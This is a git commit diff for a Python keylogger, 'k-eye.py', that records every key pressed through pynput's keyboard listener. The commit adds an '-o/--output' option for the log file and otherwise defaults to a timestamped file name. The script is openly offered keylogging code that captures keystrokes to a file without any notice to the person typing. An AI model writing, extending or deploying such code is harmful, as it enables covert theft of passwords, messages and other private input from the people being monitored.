107ab1ccfd99f162c7da09604251fe6c5bbbe775
kalculata <nprincehuzaifa@gmail.com>
2021-09-13 16:39:43 +0200

    add feature to specify the output file

--- k-eye.py
+++ k-eye.py
@@ -1,8 +1,10 @@
 from pynput.keyboard import Key, Listener
 from argparse import ArgumentParser
+from time import time
 
 
 show_detail = False
+log_file = None
 numbers = {
     '<96>': '0', '<97>': '1', '<98>': '2', '<99>': '3', '<100>': '4', '<101>': '5', '<102>': '6', '<103>': '7',
     '<104>': '8', '<105>': '9'
@@ -33,7 +35,8 @@ def on_release(key):
 
 # save every pressed key in a log file
 def save(key):
-    with open("log.txt", "a") as log:
+    global log_file
+    with open(log_file, "a") as log:
         if key.find("space") > 0:
             log.write(' ')
         elif key.find("enter") > 0:
@@ -43,12 +46,20 @@ def save(key):
 
 
 args_parser = ArgumentParser()
-args_parser.add_argument('-v', '--verbose', help="show pressed key", action="store_true")
+args_parser.add_argument('-v', '--verbose', help="show pressed key.", action="store_true")
+args_parser.add_argument('-o', '--output', help="specify the output file.")
 args = args_parser.parse_args()
 
 if args.verbose:
     print("start listening...")
     show_detail = True
+if args.output:
+    log_file = args.output
+else:
+    log_file = str(int(time())) + '.txt'
+
+# create log file
+open(log_file, 'x')
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
